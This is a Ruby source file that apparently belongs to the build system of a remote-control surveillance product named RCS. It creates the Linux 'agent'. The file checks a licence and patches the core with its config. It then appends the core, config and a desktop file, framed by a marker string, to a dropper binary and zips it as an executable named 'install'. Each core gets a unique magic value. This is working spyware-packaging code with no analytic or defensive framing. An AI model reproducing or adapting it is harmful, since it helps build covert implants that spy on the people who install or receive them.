#
#  Agent creation for linux
#

# from RCS::Common
require 'rcs-common/trace'

require 'plist'

module RCS
module DB

class BuildLinux < Build

  DROPPER_MARKER = "BmFyY5JhOGhoZjN1"

  def initialize
    super
    @platform = 'linux'
  end

  def patch(params)
    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # enforce demo flag accordingly to the license
    # or raise if cannot build
    params['demo'] = LicenseManager.instance.can_build_platform :linux, params['demo']

    # remember the demo parameter
    @demo = params['demo']

    # invoke the generic patch method with the new params
    super
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    executable = path('default')
    @appname = params['appname'] || 'install'

    dropper_size = File.size(path('dropper'))

    File.open(path('dropper'), "ab") do |f|
      f.write DROPPER_MARKER
      f.write [File.size(path('core'))].pack('I')
      f.write File.binread(path('core'))
      f.write [File.size(path('config'))].pack('I')
      f.write File.binread(path('config'))
      f.write [File.size(path('desktop'))].pack('I')
      f.write File.binread(path('desktop'))
      f.write DROPPER_MARKER
      f.write [dropper_size].pack('I')
    end

    FileUtils.mv path('dropper'), path('output')

    trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"

    @outputs = ['output']

  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      z.file.open(@appname, "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
      z.file.chmod(0755, @appname)

      z.file.open('config', "wb") { |f| f.write File.open(path('config'), 'rb') {|f| f.read} }
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

  def unique(core)
    Zip::ZipFile.open(core) do |z|
      core_content = z.file.open('core', "rb") { |f| f.read }
      add_magic(core_content)
      File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
    end

    # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core')}"
    FileUtils.rm_rf Config.instance.temp('core')
  end

end

end #DB::
end #RCS::
